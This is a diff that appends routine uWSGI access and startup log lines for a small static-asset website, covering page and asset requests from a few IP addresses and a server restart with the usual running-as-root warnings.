@@ -994,3 +994,829 @@ spawned uWSGI worker 2 (pid: 13624, cores: 4)
 [pid: 13624|app: 0|req: 400/433] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 03:15:49 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 0)
 [pid: 13624|app: 0|req: 401/434] 114.216.151.15 () {52 vars in 924 bytes} [Sat Mar 23 03:15:49 2019] GET /static/images/arrows.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
 [pid: 13624|app: 0|req: 402/435] 172.104.100.219 () {42 vars in 497 bytes} [Sat Mar 23 03:16:43 2019] GET / => generated 19465 bytes in 3 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 13624|app: 0|req: 403/436] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 03:53:15 2019] GET / => generated 19465 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 13624|app: 0|req: 404/437] 114.216.151.15 () {52 vars in 899 bytes} [Sat Mar 23 03:53:18 2019] GET /static/css/bootstrap.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 5 headers in 206 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 405/438] 114.216.151.15 () {52 vars in 904 bytes} [Sat Mar 23 03:53:18 2019] GET /static/css/font-awesome.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 2)
+[pid: 13623|app: 0|req: 34/439] 114.216.151.15 () {52 vars in 895 bytes} [Sat Mar 23 03:53:18 2019] GET /static/css/chocolat.css => generated 0 bytes in 5 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 406/440] 114.216.151.15 () {52 vars in 918 bytes} [Sat Mar 23 03:53:18 2019] GET /static/css/easy-responsive-tabs.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 2)
+[pid: 13623|app: 0|req: 35/441] 114.216.151.15 () {52 vars in 889 bytes} [Sat Mar 23 03:53:18 2019] GET /static/css/style.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 407/442] 114.216.151.15 () {52 vars in 891 bytes} [Sat Mar 23 03:53:18 2019] GET /static/css/italic.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 13623|app: 0|req: 36/443] 114.216.151.15 () {52 vars in 890 bytes} [Sat Mar 23 03:53:18 2019] GET /static/css/family.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 1)
+[pid: 13623|app: 0|req: 37/444] 114.216.151.15 () {52 vars in 899 bytes} [Sat Mar 23 03:53:18 2019] GET /static/js/modernizr-2.6.2.min.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 408/445] 114.216.151.15 () {52 vars in 922 bytes} [Sat Mar 23 03:53:18 2019] GET /static/images/banner1.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 206 bytes (0 switches on core 0)
+[pid: 13623|app: 0|req: 38/446] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 03:53:18 2019] GET /static/images/c3.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 13623|app: 0|req: 39/447] 114.216.151.15 () {52 vars in 893 bytes} [Sat Mar 23 03:53:18 2019] GET /static/js/jquery-2.1.4.min.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 3)
+[pid: 13623|app: 0|req: 40/448] 114.216.151.15 () {52 vars in 888 bytes} [Sat Mar 23 03:53:18 2019] GET /static/js/jquery.picEyes.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 13624|app: 0|req: 409/449] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 04:00:49 2019] GET / => generated 19465 bytes in 8 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 13624|app: 0|req: 410/450] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 04:04:43 2019] GET / => generated 19465 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 13624|app: 0|req: 411/451] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 04:06:24 2019] GET / => generated 19465 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 13624|app: 0|req: 412/452] 114.216.151.15 () {52 vars in 891 bytes} [Sat Mar 23 04:06:25 2019] GET /static/css/bootstrap.css => generated 0 bytes in 2 msecs (HTTP/1.1 304) 5 headers in 206 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 413/453] 114.216.151.15 () {52 vars in 896 bytes} [Sat Mar 23 04:06:25 2019] GET /static/css/font-awesome.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 0)
+[pid: 13623|app: 0|req: 41/454] 114.216.151.15 () {52 vars in 887 bytes} [Sat Mar 23 04:06:25 2019] GET /static/css/chocolat.css => generated 0 bytes in 4 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 13623|app: 0|req: 42/455] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:06:25 2019] GET /static/css/easy-responsive-tabs.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 2)
+[pid: 13623|app: 0|req: 43/456] 114.216.151.15 () {52 vars in 881 bytes} [Sat Mar 23 04:06:25 2019] GET /static/css/style.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 414/457] 114.216.151.15 () {52 vars in 883 bytes} [Sat Mar 23 04:06:25 2019] GET /static/css/italic.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 13623|app: 0|req: 44/458] 114.216.151.15 () {52 vars in 882 bytes} [Sat Mar 23 04:06:26 2019] GET /static/css/family.css => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 415/459] 114.216.151.15 () {52 vars in 891 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/modernizr-2.6.2.min.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 416/460] 114.216.151.15 () {52 vars in 914 bytes} [Sat Mar 23 04:06:26 2019] GET /static/images/banner1.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 206 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 417/461] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:26 2019] GET /static/images/c3.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 418/462] 114.216.151.15 () {52 vars in 885 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/jquery-2.1.4.min.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 3)
+[pid: 13623|app: 0|req: 45/463] 114.216.151.15 () {52 vars in 880 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/jquery.picEyes.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13623|app: 0|req: 46/464] 114.216.151.15 () {52 vars in 867 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/move-top.js => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 2)
+[pid: 13623|app: 0|req: 47/465] 114.216.151.15 () {52 vars in 863 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/easing.js => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 419/466] 114.216.151.15 () {52 vars in 883 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/jquery.chocolat.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 420/467] 114.216.151.15 () {54 vars in 980 bytes} [Sat Mar 23 04:06:26 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 421/468] 114.216.151.15 () {54 vars in 980 bytes} [Sat Mar 23 04:06:26 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 422/469] 114.216.151.15 () {52 vars in 891 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/responsiveslides.min.js => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 3)
+[pid: 13624|app: 0|req: 423/470] 114.216.151.15 () {52 vars in 891 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/easy-responsive-tabs.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 424/471] 114.216.151.15 () {52 vars in 860 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/main.js => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 425/472] 114.216.151.15 () {52 vars in 891 bytes} [Sat Mar 23 04:06:26 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 426/473] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/c1.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 13624|app: 0|req: 427/474] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/c2.png => generated 0 bytes in 0 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 428/475] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/t1.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 429/476] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/t2.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 430/477] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/t3.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 13624|app: 0|req: 431/478] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/t4.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 432/479] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/g1.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 433/480] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/g2.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 434/481] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/g3.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 13624|app: 0|req: 435/482] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/g4.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 436/483] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/g5.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 437/484] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/g6.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 438/485] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/g7.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 13624|app: 0|req: 439/486] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/g8.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 440/487] 114.216.151.15 () {52 vars in 902 bytes} [Sat Mar 23 04:06:27 2019] GET /static/images/g9.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 441/488] 114.216.151.15 () {52 vars in 904 bytes} [Sat Mar 23 04:06:28 2019] GET /static/images/g10.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 442/489] 114.216.151.15 () {52 vars in 904 bytes} [Sat Mar 23 04:06:28 2019] GET /static/images/g11.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 13624|app: 0|req: 443/490] 114.216.151.15 () {52 vars in 904 bytes} [Sat Mar 23 04:06:28 2019] GET /static/images/g12.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 444/491] 114.216.151.15 () {52 vars in 934 bytes} [Sat Mar 23 04:06:28 2019] GET /static/images/contact.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 206 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 445/492] 114.216.151.15 () {52 vars in 922 bytes} [Sat Mar 23 04:06:30 2019] GET /static/images/arr.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 202 bytes (0 switches on core 1)
+[pid: 13623|app: 0|req: 48/493] 114.216.151.15 () {52 vars in 927 bytes} [Sat Mar 23 04:06:30 2019] GET /static/images/close.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 446/494] 114.216.151.15 () {52 vars in 930 bytes} [Sat Mar 23 04:06:30 2019] GET /static/images/arrows.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13623|app: 0|req: 49/495] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 04:14:32 2019] GET / => generated 19465 bytes in 8 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 13623|app: 0|req: 50/496] 114.216.151.15 () {48 vars in 788 bytes} [Sat Mar 23 04:14:33 2019] GET /static/css/chocolat.css => generated 1951 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 3)
+[pid: 13624|app: 0|req: 447/497] 114.216.151.15 () {48 vars in 784 bytes} [Sat Mar 23 04:14:33 2019] GET /static/css/italic.css => generated 12217 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 448/498] 114.216.151.15 () {48 vars in 785 bytes} [Sat Mar 23 04:14:33 2019] GET /static/js/jquery-2.1.4.min.js => generated 84345 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 449/499] 114.216.151.15 () {48 vars in 781 bytes} [Sat Mar 23 04:14:33 2019] GET /static/js/jquery.picEyes.js => generated 2938 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 2)
+[pid: 13624|app: 0|req: 450/500] 114.216.151.15 () {48 vars in 769 bytes} [Sat Mar 23 04:14:34 2019] GET /static/js/move-top.js => generated 1330 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
+[pid: 13623|app: 0|req: 51/501] 114.216.151.15 () {48 vars in 765 bytes} [Sat Mar 23 04:14:34 2019] GET /static/js/easing.js => generated 4758 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 13623|app: 0|req: 52/502] 114.216.151.15 () {52 vars in 891 bytes} [Sat Mar 23 04:14:34 2019] GET /static/js/jquery.chocolat.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 3)
+[pid: 13623|app: 0|req: 53/503] 114.216.151.15 () {52 vars in 899 bytes} [Sat Mar 23 04:14:34 2019] GET /static/js/responsiveslides.min.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 1)
+[pid: 13623|app: 0|req: 54/504] 114.216.151.15 () {52 vars in 868 bytes} [Sat Mar 23 04:14:34 2019] GET /static/js/main.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 13624|app: 0|req: 451/505] 114.216.151.15 () {52 vars in 899 bytes} [Sat Mar 23 04:14:34 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 0)
+[pid: 13624|app: 0|req: 452/506] 114.216.151.15 () {58 vars in 1017 bytes} [Sat Mar 23 04:16:02 2019] POST / => generated 178 bytes in 5 msecs (HTTP/1.1 405) 3 headers in 108 bytes (1 switches on core 0)
+[pid: 13624|app: 0|req: 453/507] 114.216.151.15 () {48 vars in 777 bytes} [Sat Mar 23 04:16:03 2019] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+[uWSGI] getting INI configuration from /var/www/xinminhao/uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 23 04:24:30 2019] ***
+compiled with version: 6.3.0 20170516 on 21 March 2019 13:18:56
+os: Linux-4.9.0-8-amd64 #1 SMP Debian 4.9.110-3+deb9u6 (2018-10-08)
+nodename: xinminhao
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /root/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/xinminhao/
+your processes number limit is 3898
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8001 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 2.7.13 (default, Sep 26 2018, 18:42:22)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x561725fdf780
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 312672 bytes (305 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x561725fdf780 pid: 18355 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 18355)
+spawned uWSGI worker 1 (pid: 18374, cores: 4)
+spawned uWSGI worker 2 (pid: 18375, cores: 4)
+*** Stats server enabled on 127.0.0.1:9191 fd: 11 ***
+[pid: 18375|app: 0|req: 1/1] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 04:24:39 2019] GET / => generated 19519 bytes in 38 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 18375|app: 0|req: 2/2] 114.216.151.15 () {44 vars in 720 bytes} [Sat Mar 23 04:24:50 2019] GET /static/css/bootstrap.css.map => generated 232 bytes in 10 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 18375|app: 0|req: 3/3] 114.216.151.15 () {50 vars in 830 bytes} [Sat Mar 23 04:30:27 2019] GET / => generated 19519 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 18375|app: 0|req: 4/4] 114.216.151.15 () {50 vars in 956 bytes} [Sat Mar 23 04:31:30 2019] GET / => generated 19519 bytes in 9 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 18375|app: 0|req: 5/5] 114.216.151.15 () {48 vars in 788 bytes} [Sat Mar 23 04:31:31 2019] GET /static/css/chocolat.css => generated 1951 bytes in 8 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 6/6] 114.216.151.15 () {48 vars in 793 bytes} [Sat Mar 23 04:31:31 2019] GET /static/js/responsiveslides.min.js => generated 3397 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 18374|app: 0|req: 1/7] 114.216.151.15 () {48 vars in 761 bytes} [Sat Mar 23 04:31:31 2019] GET /static/js/main.js => generated 3260 bytes in 12 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 0)
+[pid: 18374|app: 0|req: 2/8] 114.216.151.15 () {54 vars in 992 bytes} [Sat Mar 23 04:31:32 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 0 bytes in 2 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 3)
+[pid: 18374|app: 0|req: 3/9] 114.216.151.15 () {54 vars in 992 bytes} [Sat Mar 23 04:31:32 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 205 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 7/10] 114.216.151.15 () {52 vars in 899 bytes} [Sat Mar 23 04:31:32 2019] GET /static/js/easy-responsive-tabs.js => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 2)
+[pid: 18374|app: 0|req: 4/11] 114.216.151.15 () {48 vars in 791 bytes} [Sat Mar 23 04:31:32 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 29110 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 8/12] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:32 2019] GET /static/images/c2.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 9/13] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:32 2019] GET /static/images/c1.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 10/14] 114.216.151.15 () {52 vars in 930 bytes} [Sat Mar 23 04:31:32 2019] GET /static/images/arr.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 202 bytes (0 switches on core 3)
+[pid: 18374|app: 0|req: 5/15] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:32 2019] GET /static/images/t2.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 18374|app: 0|req: 6/16] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:32 2019] GET /static/images/t1.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18374|app: 0|req: 7/17] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:32 2019] GET /static/images/t3.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 11/18] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:32 2019] GET /static/images/t4.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 12/19] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:32 2019] GET /static/images/g1.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 13/20] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g2.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 14/21] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g3.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 15/22] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g4.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 16/23] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g5.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 17/24] 114.216.151.15 () {52 vars in 938 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/arrows.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 18/25] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g6.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 19/26] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g7.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 20/27] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g8.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 21/28] 114.216.151.15 () {52 vars in 910 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g9.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 22/29] 114.216.151.15 () {52 vars in 912 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g10.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 1)
+[pid: 18375|app: 0|req: 23/30] 114.216.151.15 () {52 vars in 912 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g11.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 3)
+[pid: 18375|app: 0|req: 24/31] 114.216.151.15 () {52 vars in 912 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/g12.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 204 bytes (0 switches on core 2)
+[pid: 18375|app: 0|req: 25/32] 114.216.151.15 () {52 vars in 942 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/contact.jpg => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 206 bytes (0 switches on core 0)
+[pid: 18375|app: 0|req: 26/33] 114.216.151.15 () {52 vars in 935 bytes} [Sat Mar 23 04:31:33 2019] GET /static/images/close.png => generated 0 bytes in 1 msecs (HTTP/1.1 304) 5 headers in 203 bytes (0 switches on core 1)
